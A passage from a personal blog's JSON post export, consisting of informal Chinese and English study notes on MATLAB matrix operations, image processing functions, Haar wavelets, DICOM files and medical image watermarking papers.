allowfullscreen&gt;&lt;/iframe&gt;","categories":[],"tags":[{"name":"SVM","slug":"SVM","permalink":"http://finsenty54.github.io/tags/SVM/"}]},{"title":"essay1","slug":"essay1","date":"2020-02-19T05:42:06.000Z","updated":"2020-02-19T05:42:58.270Z","comments":true,"path":"2020/02/19/essay1/","link":"","permalink":"http://finsenty54.github.io/2020/02/19/essay1/","excerpt":"","text":"matlab可以 psnr() RGB图像直接来 Normalized Cross Correlationnormxcorr2 matlab计算方法不同The value is generally 0–1. However, ideally it should be 1 but the value 0.7 is acceptable.","categories":[],"tags":[{"name":"matlab","slug":"matlab","permalink":"http://finsenty54.github.io/tags/matlab/"}]},{"title":"matlab_haar3","slug":"matlab_haar3","date":"2020-02-18T06:39:08.000Z","updated":"2020-02-18T06:39:50.920Z","comments":true,"path":"2020/02/18/matlab_haar3/","link":"","permalink":"http://finsenty54.github.io/2020/02/18/matlab_haar3/","excerpt":"RGB 三个二维数组分别表示R,G,B即，如果imshow的参数类型为double ，那么参数的取值范围只有在[0 1]才会正常显示。当值大于1时，都显示白色。这与matlab的传统是一致的， 对于灰度图像，uint8表示范围是[0 255] ,double表示范围是[0 1]","text":"RGB 三个二维数组分别表示R,G,B即，如果imshow的参数类型为double ，那么参数的取值范围只有在[0 1]才会正常显示。当值大于1时，都显示白色。这与matlab的传统是一致的， 对于灰度图像，uint8表示范围是[0 255] ,double表示范围是[0 1]isequal() 塞尔达荒野之息Onedrive https://imhuanggh-my.sharepoint.com/:f:/g/personal/bin_imhuanggh_onmicrosoft_com/EhOlmQivpRBLh3BLkqxyDLYBW0JDW1V7i8lixd1T1Df-4g","categories":[],"tags":[{"name":"matlab","slug":"matlab","permalink":"http://finsenty54.github.io/tags/matlab/"}]},{"title":"matlab_haar2","slug":"matlab_haar2","date":"2020-02-12T06:09:07.000Z","updated":"2020-02-12T06:09:39.007Z","comments":true,"path":"2020/02/12/matlab_haar2/","link":"","permalink":"http://finsenty54.github.io/2020/02/12/matlab_haar2/","excerpt":"imbinarizeBinarize 2-D grayscale image or 3-D volume by thresholding","text":"imbinarizeBinarize 2-D grayscale image or 3-D volume by thresholding 64:1ans = 空的 1×0 double 行向量我人傻了注意文件所在文件夹这两个问题弄了我一下午 图形的函数 fliplr 可以从左往右地翻转矩阵 我觉得我懂炒股了https://player.bilibili.com/player.html?aid=68967083&amp;cid=119544791&amp;page=1","categories":[],"tags":[{"name":"matlab","slug":"matlab","permalink":"http://finsenty54.github.io/tags/matlab/"}]},{"title":"matlab_haar1","slug":"matlab_haar1","date":"2020-02-11T05:53:24.000Z","updated":"2020-02-11T05:54:14.257Z","comments":true,"path":"2020/02/11/matlab_haar1/","link":"","permalink":"http://finsenty54.github.io/2020/02/11/matlab_haar1/","excerpt":"waveletfamilies(&apos;a&apos;) waveletfamilies(&apos;f&apos;) waveinfo(&apos;db&apos;) use wfilters, wavefun, and wpfun to obtain the filters, wavelet, or wavelet packets","text":"waveletfamilies(&apos;a&apos;) waveletfamilies(&apos;f&apos;) waveinfo(&apos;db&apos;) use wfilters, wavefun, and wpfun to obtain the filters, wavelet, or wavelet packets linspaceGenerate linearly spaced vectorcollapse all in pageSyntaxy = linspace(x1,x2)y = linspace(x1,x2,n) 小波的含义，即为时间上衰减快，和傅里叶的正弦波相比要短。在频率域上，通过拉伸或压缩小波的长度，来改变小波的长短和频率，实现不同频率下的小波系数。小波中，一般用尺度scale来衡量小波的频率f，两者之间的转换关系为：scale∗f=Fs∗wcfscale f=Fs wcfscale∗f=Fs∗wcf公式中，Fs代表信号的采样频率，wcf为小波的中心频率（wave central freq），在matlab里可以用 centfrq(wavename) 来查询。 噪点 高频信号 imagescDisplay image with scaled colors 尺度函数又称为小波父函数phi 希腊文 haart2（x，level)If level is greater than 1, then h, v, and d are cell arrays. If level is equal to 1, then h, v, and d are matrices.2-D Haar wavelet transform ihaart2Inverse 2-D Haar wavelet transform","categories":[],"tags":[{"name":"matlab","slug":"matlab","permalink":"http://finsenty54.github.io/tags/matlab/"}]},{"title":"matlab图像示例笔记3","slug":"matlab图像示例笔记3","date":"2020-02-10T06:47:00.000Z","updated":"2020-02-10T06:56:40.270Z","comments":true,"path":"2020/02/10/matlab图像示例笔记3/","link":"","permalink":"http://finsenty54.github.io/2020/02/10/matlab图像示例笔记3/","excerpt":"mat2gray 将dicom变为greyim2uint8","text":"mat2gray 将dicom变为greyim2uint8 The image on the right has higher contrast, with intensity values that fill the entire intensity range [0, 255]. 如果指定空矩阵 ([])，则 imshow 使用 [min(I(:)) max(I(:))]。换言之，使用 I 中的最小值作为黑色，使用最大值作为白色。 imadjustYou must specify the intensities as values between 0 and 1 regardless of the class of I. If I is uint8, the values you supply are multiplied by 255 to determine the actual values to use; if I is uint16, the values are multiplied by 65535. figure,imshow(pout_histeq);title(‘Histeq’); ROICreate a Binary MaskYou can use the createMask function of the imroi base class to create a binary mask for any type of ROI object — impoint, imline, imrect, imellipse, impoly, or imfreehand.","categories":[],"tags":[{"name":"matlab","slug":"matlab","permalink":"http://finsenty54.github.io/tags/matlab/"}]},{"title":"matlab图像示例笔记2","slug":"matlab图像示例笔记2","date":"2020-02-07T08:23:56.000Z","updated":"2020-02-10T06:56:33.170Z","comments":true,"path":"2020/02/07/matlab图像示例笔记2/","link":"","permalink":"http://finsenty54.github.io/2020/02/07/matlab图像示例笔记2/","excerpt":"dicom （a image type using in medical)To read metadatafrom a DICOM file, use the dicominfo function To readimage datafrom a DICOM file, use the dicomread function.","text":"dicom （a image type using in medical)To read metadatafrom a DICOM file, use the dicominfo function To readimage datafrom a DICOM file, use the dicomread function. If you just want to view the metadata in a DICOM file, for debugging purposes, you can use thedicomdisp function. use one of the toolbox image display functions imshow or imtool. the image data in this DICOM file is signed 16-bit data, you must use the autoscaling syntax with either display function to make the image viewable.imshow(I,&#39;DisplayRange&#39;,[]) use the dicomanon function. Remove Confidential Information To write image data or metadata to a file in DICOM format, use the dicomwrite function. Create New DICOM Seriesinfo.SeriesInstanceUID Generate a new DICOM unique identifier (UID) using the dicomuid function. uid = dicomuid info.SeriesInstanceUID = uid; dicomwrite(Imodified,&apos;ankle_newseries.dcm&apos;,info); The example finds the maximum and minimum values of all pixels in the image. The pixels that form the white text charactersareset to the maximum pixel value. MATLAB command prompt: Enter dicomBrowser. Image Type Conversion","categories":[],"tags":[{"name":"matlab","slug":"matlab","permalink":"http://finsenty54.github.io/tags/matlab/"}]},{"title":"matlab图像示例笔记1","slug":"matlab图像示例笔记1","date":"2020-02-06T06:30:11.000Z","updated":"2020-02-06T06:30:57.460Z","comments":true,"path":"2020/02/06/matlab图像示例笔记1/","link":"","permalink":"http://finsenty54.github.io/2020/02/06/matlab图像示例笔记1/","excerpt":"对比度histogram 直方图Precede the call to imhistwith the figurecommand so that the histogram does not overwrite the display of the image I in the current figure window. To see the distribution of intensities in the image, create a histogram by calling the imhist function.输入图片，图片要求为灰度图或者二值图 imhist","text":"对比度histogram 直方图Precede the call to imhistwith the figurecommand so that the histogram does not overwrite the display of the image I in the current figure window. To see the distribution of intensities in the image, create a histogram by calling the imhist function.输入图片，图片要求为灰度图或者二值图 imhist F=imread(‘test.jpg’); I=rgb2gray(F); [count,x]=imhist(I，30) % 获取直方图的横坐标和纵坐标，即各个像素级，以及每个像素级上的像素出现的次数figure; subplot(221);imhist(I,2); subplot(222);imhist(I,5); subplot(223);imhist(I,10); subplot(224);imhist(I); figure; subplot(121); imhist(I,10) [count,x] = imhist(I,10) subplot(122);stem(x,count); stem绘制离散序列数据 Improve the contrastin an image, using the histeq function. The toolbox includes several other functions that perform contrast adjustment, including imadjust and adapthisteq, and interactive tools such as the Adjust Contrast tool, available in the Image Vieweradjust the contrast 灰度直方图均衡化histeq Correct Nonuniform Background Illumination and Analyze Foreground Objectsnonuniform strel（）Morphological structuring element J = imopen(I,SE)performs morphological opening on the grayscale or binary image I, returning the opened image, J. SE is a single structuring element object returned by the strel or offsetstrel functions. The morphological open operation is an erosion followed by a dilation, using the same structuring element for both operations. surf曲面图全页折叠语法surf(X,Y,Z)surf(X,Y,Z,C) f1=imadjust（f，[low_in high_in],[low_out high_out],gamma）该函数的意义如图1所示，把图像f 灰度变换到新图像f1的过程中，f 中灰度值低于low_in的像素点在f1中灰度值被赋值为low_out,同理，f中灰度值高于high_in的像素点变换到f1时其灰度值也被赋值为high_out; J=imadjust(I,[0.2 0.5],[0 1])原图像灰度范围为0-255，程序将小于255×0.2的灰度值设置为0，将大于255×0.5的灰度值设置为255 饱和度取决于该色中含色成分和消色成分（灰色）的比例比度指的是一幅图像中明暗区域最亮的白和最暗的黑之间不同亮度层级的测量，差异范围越大代表对比越大 Use theimbinarize function to convert the grayscale image into abinary image Remove background noise from the image with thebwareaopen function. F = false(sz1,…,szN) 是由逻辑值“0”组成的 sz1×…×szN 数组，其中 sz1,…,szN 表示每个维度的大小。例如，false(2,3) 返回由逻辑值“0”组成的 2×3 数组。","categories":[],"tags":[{"name":"matlab","slug":"matlab","permalink":"http://finsenty54.github.io/tags/matlab/"}]},{"title":"matlab笔记5 image","slug":"matlab笔记5","date":"2020-02-05T05:41:19.000Z","updated":"2020-02-05T05:42:28.598Z","comments":true,"path":"2020/02/05/matlab笔记5/","link":"","permalink":"http://finsenty54.github.io/2020/02/05/matlab笔记5/","excerpt":"使用基于帕斯卡三角形的项创建一个对称矩阵：A = pascal(3) randi 的第一个输入描述整数可能值的范围，后面两个输入描述行和列的数量。C = randi(10,3,2) 有一个专门的点积函数，称为 dot。","text":"使用基于帕斯卡三角形的项创建一个对称矩阵：A = pascal(3) randi 的第一个输入描述整数可能值的范围，后面两个输入描述行和列的数量。C = randi(10,3,2) 有一个专门的点积函数，称为 dot。非共轭复数转置（其中每个元素的复数部分保留其符号）表示为z.&#39; eye(m,n)返回 m×n 矩形单位矩阵，eye(n) 返回 n×n 单位方阵。 向量 x 的 p-范数，norm(x,p) 进行计算，此运算是为 p &gt; 1 的任意值定义的，但最常见的 p 值为 1、2 和 ∞。默认值为 p = 2， x = b/A表示使用 mrdivide 获得的矩阵方程 xA = b 的解。x = A\\b表示使用 mldivide 获得的矩阵方程 Ax = b 的解。 (b/A)&#39; = (A&#39;\\b&#39;).m = n方阵方程组。求精确解。m &gt; n超定方程组，即方程个数多于未知数个数。求最小二乘解。m &lt; n欠定方程组，即方程个数少于未知数个数。使用最多 m 个非零分量求基本解。 非奇异矩阵==可逆矩阵 eig特征值和特征向量 提供的数据分析函数的列表，请键入help datafun 图像要显示图像，请使用 imshow 函数：imshow(X,map)使用imread 函数可以读取标准图像文件（TIFF、JPEG、PNG 等）。imread 返回的数据类型取决于读取的图像类型。使用imwrite 函数可以将 MATLAB 数据写入到各种标准图像格式。大多数图像表示为二维数组（矩阵），其中矩阵的每个元素对应所显示图像的一个像素。例如，由 200 行和 300 列不同颜色的点组成的图像保存为一个 200×300 的矩阵。有些图像，如 RGB，需要三维数组，其中三个维度的第一个平面表示红色像素强度，第二个平面表示绿色像素强度，第三个平面表示蓝色像素强度。MATLAB 数学支持三种不同的数值类用于图像显示：双精度浮点数（double）16 位无符号整数（uint16）8 位无符号整数（uint8） imshow 显示图像 image 从数组显示图像 imagesc 显示使用经过标度映射的颜色的图像 imread 从图形文件读取图像 imresize 调整图像大小 imwrite 将图像写入图形文件 imfinfo 有关图形文件的信息 imformats 管理图像文件格式注册表 frame2im 返回与影片帧关联的图像数据 im2frame 将图像转换为影片帧 im2java 将图像转换 Java 图像 im2double 将图像转换为双精度值 ind2rgb 将索引图像转换为 RGB 图像 rgb2gray 将 RGB 图像或颜色图转换为灰度图 rgb2ind 将 RGB 图像转换为索引图像 imapprox 通过减少颜色数量来近似处理索引图像 dither 转换图像，通过抖动提高表观颜色分辨率 cmpermute 重新排列颜色图中的颜色 cmunique 消除颜色图中的重复颜色；将灰度或真彩色图像转换为索引图像 A = imread(&#39;ngc6543a.jpg&#39;); 索引图像由数据矩阵 X 和颜色图矩阵 map 组成。map 是一个 double 类的 m×3 数组，由 [0, 1] 范围内的浮点值组成。map 的每一行指定单一颜色的红、绿和蓝分量。索引图像使用像素值到颜色图值的“直接映射”。每个图像像素的颜色是以 X 中的对应值为索引求得的 map 中的值。因此 X 值必须是整数。值 1 指向 map 中第一行，值 2 指向第二行，以此类推。使用以下语句显示索引图像。image(X); colormap(map)图像矩阵和颜色图中值的关系取决于图像矩阵的类。如果图像矩阵是 double 类，那么值 1 指向颜色图中的第一行，值 2 指向第二行，以此类推。如果图像矩阵是 uint8 或 uint16 类，那么有个偏移 - 值 0 指向颜色图中的第一行，值 1 指向第二行，以此类推。在图形文件格式中使用偏移是为了使可支持的颜色数目达到最大。在上面的图像中，图像矩阵是 double 类。 强度图像是一个数据矩阵 I，其中的值表示某一范围内的强度。强度图像表示为单个矩阵，矩阵的每个元素对应一个图像像素。imagesc(A); colormap(gray)imagesc(A,[min(A(:)) max(A(:))]); colormap(gray) bit-depth：使用多少位来定义一个像素点。bit-depth越大，可以表示的色彩就越多。通常情况下，图像的像素值范围为0-255， 则其bit-depth就是8。RGB图像的bit-depth为24：8bit表示R，8bit表示G，8bit表示B。 RGB 图像，有时称为真彩色图像，以 m×n×3 数据数组形式存储，该数组定义了对应图像每个像素的红色、绿色和蓝色分量。例如像素 (10,5) 的红色、绿色和蓝色分量分别存储在 RGB(10,5,1)、RGB(10,5,2) 和 RGB(10,5,3) 中。 您可以对 uint8 和 uint16 数组执行其他几种操作，包括：使用 reshape、cat、permute 函数以及 [] 和 ‘ 运算符重构、重新排序和串联数组使用 save 和 load 将 uint8 和 uint16 数组保存及加载到 MAT 文件。（请记住，如果要加载或保存图形格式文件图像，则必须使用 imread 和imwrite 命令代替。）使用 find 定位 uint8 和 uint16 数组中非零元素的索引。但返回的数组始终为 double 类。关系运算符 基于 NTSC 标准合并 RGB 值，以此方式来计算单色亮度，这会将与眼睛敏感度相关的系数应用到 RGB 颜色： I = .2989*rgb_img(:,:,1)... +.5870*rgb_img(:,:,2)... +.1140*rgb_img(:,:,3);","categories":[],"tags":[{"name":"matlab","slug":"matlab","permalink":"http://finsenty54.github.io/tags/matlab/"}]},{"title":"matlab笔记4","slug":"matlab笔记4","date":"2020-02-03T05:12:21.000Z","updated":"2020-02-03T05:13:01.660Z","comments":true,"path":"2020/02/03/matlab笔记4/","link":"","permalink":"http://finsenty54.github.io/2020/02/03/matlab笔记4/","excerpt":"B = A - 8.5 B(1:2,2:3) = 0 x = [2.1 1.7 1.6 1.5 NaN 1.9 1.8 1.5 5.1 1.8 1.4 2.2 1.6 1.8]; x = x(isfinite(x)) x = 2.1 1.7 1.6 1.5 1.9 1.8 1.5 5.1 1.8 1.4 2.2 1.6 1.8 x = x(abs(x-mean(x)) &lt;= 3*std(x)) x = 2.1 1.7 1.6 1.5 1.9 1.8 1.5 1.8 1.4 2.2 1.6 1.8","text":"B = A - 8.5 B(1:2,2:3) = 0 x = [2.1 1.7 1.6 1.5 NaN 1.9 1.8 1.5 5.1 1.8 1.4 2.2 1.6 1.8]; x = x(isfinite(x)) x = 2.1 1.7 1.6 1.5 1.9 1.8 1.5 5.1 1.8 1.4 2.2 1.6 1.8 x = x(abs(x-mean(x)) &lt;= 3*std(x)) x = 2.1 1.7 1.6 1.5 1.9 1.8 1.5 1.8 1.4 2.2 1.6 1.8 find 函数可用于确定与指定逻辑条件相符的数组元素的索引。find 以最简单的形式返回索引的列向量。转置该向量以便获取索引的行向量。 k = find(isprime(A))&apos; k = 2 5 9 10 11 13 R = randn(3,4,5); MATLAB 中的元胞数组是以其他数组的副本为元素的多维数组C = {A sum(A) prod(prod(A))}。第一，要检索某个元胞的内容，请在花括号中使用下标。例如，C{1} 检索幻方矩阵，C{3} 为 16!。第二，元胞数组包含其他数组的副本，而不包含指向这些数组的指针。 M = cell(8,1); 元胞数组 for n = 1:8 M{n} = magic(n); end M v = [s; &#39;world&#39;]垂直联接字符并生成 v = Hello world char 函数可执行这种填充操作。例如，S = char(&#39;A&#39;,&#39;rolling&#39;,&#39;stone&#39;,&#39;gathers&#39;,&#39;momentum.&#39;) 也可以将文本存储在元胞数组中。例如， C = {&#39;A&#39;;&#39;rolling&#39;;&#39;stone&#39;;&#39;gathers&#39;;&#39;momentum.&#39;} 可以将填充后的字符数组转换为字符向量元胞数组：C = cellstr(S)使用以下语句可以逆转此过程S = char(C) 结构体是多维 MATLAB 数组，包含可按文本字段标志符访问的元素。例如， S.name = &apos;Ed Plum&apos;; S.score = 83; S.grade = &apos;B+&apos; S = name: &apos;Ed Plum&apos; score: 83 grade: &apos;B+&apos; 可以一次添加一个字段， S(2).name = &apos;Toni Miller&apos;; S(2).score = 91; S(2).grade = &apos;A-&apos;; 可以使用一个语句添加整个元素： S(3) = struct(&apos;name&apos;,&apos;Jerry Garcia&apos;,... &apos;score&apos;,70,&apos;grade&apos;,&apos;C&apos;) 键入S.score与键入S(1).score, S(2).score, S(3).score相同，这是一个逗号分隔列表。 scores = [S.score] names = char(S.name) names = {S.name} [N1 N2 N3] = S.name 访问结构体数据的另一种方法是使用动态字段名称。这些名称将字段表示为变量表达式，MATLAB 会在运行时计算这些表达式。此处显示的点-括号语法将 expression 作为动态字段名称：structName.(expression)例如，要在字段名称中计算 expression，并在行 7 中的 1 至 25 列内获取该字段的值，请使用structName.(expression)(7,1:25)","categories":[],"tags":[{"name":"matlab","slug":"matlab","permalink":"http://finsenty54.github.io/tags/matlab/"}]},{"title":"matlab笔记3","slug":"matlab笔记3","date":"2020-02-02T06:12:38.000Z","updated":"2020-02-02T06:13:25.447Z","comments":true,"path":"2020/02/02/matlab笔记3/","link":"","permalink":"http://finsenty54.github.io/2020/02/02/matlab笔记3/","excerpt":"科学记数法使用字母 e 来指定 10 次方的缩放因子浮点数的有限精度约为 16 位有效小数位数，有限范围约为 10-308 至 10+308。双精度格式表示的数字的最大精度为 52 位。整数的可用精度为 8 位、16 位、32 位和 64 位 x = uint64(36028797018963968); y = uint64(36028797018963972);","text":"科学记数法使用字母 e 来指定 10 次方的缩放因子浮点数的有限精度约为 16 位有效小数位数，有限范围约为 10-308 至 10+308。双精度格式表示的数字的最大精度为 52 位。整数的可用精度为 8 位、16 位、32 位和 64 位 x = uint64(36028797018963968); y = uint64(36028797018963972); 例如，sort 函数根据量值进行排序，如果量值相等，则根据相位角度排序。 sort([3+4i, 4+3i]) 量值都为5 ans = 4.0000 + 3.0000i 3.0000 + 4.0000i angle(3+4i) ans = 0.9273 “等于”关系运算符 == 要求实部和虚部相等。其他二进制关系运算符 &gt;、&lt;、&gt;= 和 &lt;= 忽略数字的虚部，而仅考虑实部。 数组运算对构建表非常有用。假定 n 为列向量n = (0:9)&#39;;然后，pows = [n n.^2 2.^n]构建一个平方和 2 次幂的表： pows = 0 0 1 1 1 2 2 4 4 3 9 8 4 16 16 5 25 32 6 36 64 7 49 128 8 64 256 9 81 512 format short g x = (1:0.1:2)&apos;; logs = [x log10(x)] 构建一个对数表。 logs = 1.0 0 1.1 0.04139 1.2 0.07918 1.3 0.11394 1.4 0.14613 1.5 0.17609 1.6 0.20412 1.7 0.23045 1.8 0.25527 1.9 0.27875 2.0 0.30103 有关初等数学函数的列表，请键入help elfun有关更多高等数学函数和矩阵函数的列表，请键入help specfunhelp elmat format 函数控制所显示的值的数值格式。 x = [4/3 1.2345e-6] format short 1.3333 0.0000 format short e 1.3333e+000 1.2345e-006 format short g 1.3333 1.2345e-006 format long 1.33333333333333 0.00000123450000 format long e 1.333333333333333e+000 1.234500000000000e-006 format long g 1.33333333333333 1.2345e-006 format bank 1.33 0.00 format rat 4/3 1/810045 format hex 3ff5555555555555 3eb4b6231abfd271 语句无法容纳在一行中，请使用省略号（三个句点）… 要进一步控制输出格式，请使用 sprintf 和 fprintf 函数。 100:-7:50 sum(A(1:4,4)) sum(A(:,end)) end 引用最后一个行或列 为什么 4×4 幻方矩阵的幻数和等于 34？如果将介于 1 到 16 之间的整数分为四个总和相等的组，该总和必须为sum(1:16)/4当然，也即ans = 34 B = [A A+32; A+48 A+16] 要删除 X 的第二列，请使用X(:,2) = [] X( 2 : 2 : 10) = [] 按列数第几个生成X = 16 9 2 7 13 12 1","categories":[],"tags":[{"name":"matlab","slug":"matlab","permalink":"http://finsenty54.github.io/tags/matlab/"}]},{"title":"matlab笔记2","slug":"matlab笔记2","date":"2020-02-01T11:17:59.000Z","updated":"2020-02-02T06:12:27.923Z","comments":true,"path":"2020/02/01/matlab笔记2/","link":"","permalink":"http://finsenty54.github.io/2020/02/01/matlab笔记2/","excerpt":"处理文本时，将字符序列括在单引号中。可以将文本赋给变量。myText = &#39;Hello, world&#39;;如果文本包含单引号，使用两个单引号。 otherText = &apos;You&apos;&apos;re right&apos; otherText = &apos;You&apos;re right&apos;","text":"处理文本时，将字符序列括在单引号中。可以将文本赋给变量。myText = &#39;Hello, world&#39;;如果文本包含单引号，使用两个单引号。 otherText = &apos;You&apos;&apos;re right&apos; otherText = &apos;You&apos;re right&apos; whos查询已有变量 可以使用方括号串联字符数组，就像串联数值数组一样。longText = [myText,&#39; - &#39;,otherText] 要将数值转换为字符，使用 num2str 或 int2str 等函数。 f = 71; c = (f-32)/1.8; tempText = [&apos;Temperature is &apos;,num2str(c),&apos;C&apos;] 调用函数，例如 max，请将其输入参数括在圆括号中，存在多个输入参数，请使用逗号加以分隔，存在多个输出参数，请将其括在方括号中： [maxA,location] = max(A) maxA = 5 location = 3 任何字符输入括在单引号中：disp(&#39;hello world&#39;) 创建二维线图，请使用 plot（绘制） 函数。 x = 0:pi/100:2*pi; 创建矩阵的一种方法 y = sin(x); plot(x,y） 标记轴并添加标题。 xlabel(&apos;x&apos;) ylabel(&apos;sin(x)&apos;) title(&apos;Plot of the Sine Function&apos;) 向 plot 函数添加第三个输入参数，您可以使用红色虚线绘制相同的变量。plot(x,y,&#39;r--&#39;)‘r–’ 为线条设定。每个设定可包含表示线条颜色、样式和标记的字符。标记是在绘制的每个数据点上显示的符号，例如，+、o 或 。例如，’g:‘ 请求绘制使用 * 标记的绿色点线。 将绘图添加到现有图窗中，请使用 hold on。在使用 hold off 或关闭窗口之前，当前图窗窗口中会显示所有绘图 hold on y2 = cos(x); plot(x,y2,&apos;:&apos;) legend(&apos;sin&apos;,&apos;cos&apos;) legend就是添加图例的标注 比如：legend(&apos;First&apos;,&apos;Second&apos;,-1)，表示字符串依次注释plot中的图，后面板的参数（此处是-1）表示注释的位置。 hold off 三维图通常显示一个由带两个变量的函数（即 z = f (x,y)）定义的曲面图。 [X,Y] = meshgrid(-2:.2:2); STEP=0.2 meshgrid函数生成的X，Y是大小相等的矩阵 surf 函数及其伴随函数 mesh 以三维形式显示曲面图。surf 使用颜色显示曲面图的连接线和面。mesh 生成仅以颜色标记连接定义点的线条的线框曲面图。 使用 subplot 函数可以在同一窗口的不同子区域显示多个绘图。subplot 的前两个输入表示每行和每列中的绘图数。第三个输入指定绘图是否处于活动状态。 键入脚本名称即可运行该脚本。脚本是最简单的一种 MATLAB® 程序。脚本是一个包含多行连续 MATLAB 命令和函数调用的扩展名为.m的文件。在命令行中键入脚本名称即可运行该脚本。要创建脚本，请使用 edit 命令。edit plotrand使用百分比 (%) 符号添加注释 nsamples = 5; npoints = 50; for k = 1:nsamples currentData = rand(npoints,1); sampleMean(k) = mean(currentData); end overallMean = mean(sampleMean) if overallMean &lt; .49 disp(&apos;Mean is less than expected&apos;) elseif overallMean &gt; .51 disp(&apos;Mean is greater than expected&apos;) else disp(&apos;Mean is within the expected range&apos;) end 使用 doc 命令在单独的窗口中打开函数文档。doc mean在键入函数输入参数的左括号之后暂停，此时命令行窗口中会显示相应函数的提示使用 help 命令可在命令行窗口中查看相应函数的简明文档。 使用空格或逗号分隔行的元素。使用分号 ; 表示每行末尾。使用方括号 [ ] 将整个元素列表括起来。 sum(A) 计算列sum(A’)’避免双重转置的其他方法，请在 sum 函数中使用维度参数：sum(A,2) diag(A) 获取对角线值 图形的函数 fliplr 可以从左往右地翻转矩阵：sum(diag(fliplr(A))) magic 函数创建几乎任意大小的幻方矩阵。行列对角线相加都相同四个用于生成基本矩阵的函数。zeros全部为零ones全部为 1rand均匀分布的随机元素randn正态分布的随机元素 MATLAB 不需要任何类型声明或维度说明。当 MATLAB 遇到新的变量名称时，它会自动创建变量，并分配适当大小的存储。如果此变量已存在，MATLAB 会更改其内容，并根据需要分配新存储。 MATLAB 仅使用名称的前 N 个字符（其中 N 是函数 namelengthmax 返回的数字） 为63","categories":[],"tags":[{"name":"matlab","slug":"matlab","permalink":"http://finsenty54.github.io/tags/matlab/"}]},{"title":"matlab笔记1","slug":"matlab笔记1","date":"2020-01-30T11:49:15.000Z","updated":"2020-01-30T11:55:39.032Z","comments":true,"path":"2020/01/30/matlab笔记1/","link":"","permalink":"http://finsenty54.github.io/2020/01/30/matlab笔记1/","excerpt":"a = [1 2 3 4]创建矩阵的另一种方法是使用 ones、zeros 或 rand 等函数。例如，创建一个由零组成的 5×1 列向量。z = zeros(5,1) MATLAB 允许您使用单一的算术运算符或函数来处理矩阵中的所有值。a + 10","text":"a = [1 2 3 4]创建矩阵的另一种方法是使用 ones、zeros 或 rand 等函数。例如，创建一个由零组成的 5×1 列向量。z = zeros(5,1) MATLAB 允许您使用单一的算术运算符或函数来处理矩阵中的所有值。a + 10 要转置矩阵，请使用单引号 (‘) format 命令可以显示更多小数位数：123format longp = a*inv(a)format short format 仅影响数字显示，而不影响 MATLAB 对数字的计算或保存方式。 要执行元素级乘法（而非矩阵乘法），请使用 . 运算符：`p = a.a乘法、除法和幂的矩阵运算符分别具有执行元素级运算的对应数组运算符。例如，计算 a 的各个元素的三次方：a.^3` 串联是连接数组以便形成更大数组的过程。实际上，第一个数组是通过将其各个元素串联起来而构成的。成对的方括号 [] 即为串联运算符。A = [a,a] 使用逗号将彼此相邻的数组串联起来称为水平串联。每个数组必须具有相同的行数。同样，如果各数组具有相同的列数，则可以使用分号垂直串联。A = [a; a] 要表示复数的虚部，请使用 i 或 j。 c = [3+4i, 4+3j; -i, 10j] c = 2×2 complex clc 每个变量都是一个可包含许多数字的数组 引用数组中的特定元素有两种方法。最常见的方法是指定行和列下标，例如A(4,2)另一种方法不太常用，但有时非常有用，即使用单一下标按顺序向下遍历每一列：A(8)可以在赋值语句左侧指定当前维外部的元素。数组大小会增大以便容纳新元素。A(4,5) = 17 要引用多个数组元素，请使用冒号运算符，这使您可以指定一个格式为start:end的范围。例如，列出 A 前三行及第二列中的元素：A(1:3,2)单独的冒号（没有起始值或结束值）指定该维中的所有元素。例如，选择 A 第三行中的所有列：A(3,:) 冒号运算符还允许您使用较通用的格式start: step :end创建等距向量值。如果省略中间的步骤（如 start:end 中），MATLAB 会使用默认步长值 1。B = 0:10:100 退出 MATLAB 后，工作区变量不会保留。使用save命令保存数据以供将来使用，save myfile.mat要清除工作区中的所有变量，请使用clear命令。使用 load 将 MAT 文件中的数据还原到工作区。load myfile.mat","categories":[],"tags":[{"name":"matlab","slug":"matlab","permalink":"http://finsenty54.github.io/tags/matlab/"}]},{"title":"Medical Image WatermarkingTechniques and Applications>>笔记4","slug":"Medical Image WatermarkingTechniques and Applications>>笔记4","date":"2020-01-28T10:45:56.000Z","updated":"2020-01-29T07:35:45.871Z","comments":true,"path":"2020/01/28/Medical Image WatermarkingTechniques and Applications>>笔记4/","link":"","permalink":"http://finsenty54.github.io/2020/01/28/Medical Image WatermarkingTechniques and Applications>>笔记4/","excerpt":"orthonormal matrices 正交矩阵a message can be hidden in cover document if the content of the document hashigh redundancy.propose a new reliable method by hiding the encrypted watermark in the RONI part of the medical image using DWT approach.ROI Based Medical Image Watermarking with Zero Distortion and Enhanced Security 所读论文 直方图均衡化（Histogram Equalization）","text":"orthonormal matrices 正交矩阵a message can be hidden in cover document if the content of the document hashigh redundancy.propose a new reliable method by hiding the encrypted watermark in the RONI part of the medical image using DWT approach.ROI Based Medical Image Watermarking with Zero Distortion and Enhanced Security 所读论文 直方图均衡化（Histogram Equalization）","categories":[],"tags":[{"name":"watermark","slug":"watermark","permalink":"http://finsenty54.github.io/tags/watermark/"}]},{"title":"Medical Image WatermarkingTechniques and Applications>>笔记3","slug":"Medical Image WatermarkingTechniques and Applications>>笔记3","date":"2020-01-25T07:21:36.000Z","updated":"2020-01-29T07:29:13.842Z","comments":true,"path":"2020/01/25/Medical Image WatermarkingTechniques and Applications>>笔记3/","link":"","permalink":"http://finsenty54.github.io/2020/01/25/Medical Image WatermarkingTechniques and Applications>>笔记3/","excerpt":"There are a wide variety of popular wavelet algorithms, including Daubechies wavelets, Mexican Hat wavelets and Morlet wavelets HAAR In addition, the Haar wavelet transform is fast, memory efficient and exactly reversible without the edge effects that are present in other wavelet transforms. the water-mark can be embedded into the other three sub-bands (HL, LH and HH sub-band) to maintain better image quality.","text":"There are a wide variety of popular wavelet algorithms, including Daubechies wavelets, Mexican Hat wavelets and Morlet wavelets HAAR In addition, the Haar wavelet transform is fast, memory efficient and exactly reversible without the edge effects that are present in other wavelet transforms. the water-mark can be embedded into the other three sub-bands (HL, LH and HH sub-band) to maintain better image quality.","categories":[],"tags":[{"name":"watermark","slug":"watermark","permalink":"http://finsenty54.github.io/tags/watermark/"}]},{"title":"Medical Image WatermarkingTechniques and Applications>>笔记2","slug":"Medical Image WatermarkingTechniques and Applications>>笔记2","date":"2020-01-23T05:37:04.000Z","updated":"2020-01-23T05:46:12.002Z","comments":true,"path":"2020/01/23/Medical Image WatermarkingTechniques and Applications>>笔记2/","link":"","permalink":"http://finsenty54.github.io/2020/01/23/Medical Image WatermarkingTechniques and Applications>>笔记2/","excerpt":"state-of-the-art 最先进的Error Correcting Codes ECCdiscrete wavelet transform (DWT) 离散小波变换The ECC based watermarking methods attempt to find a trade-off 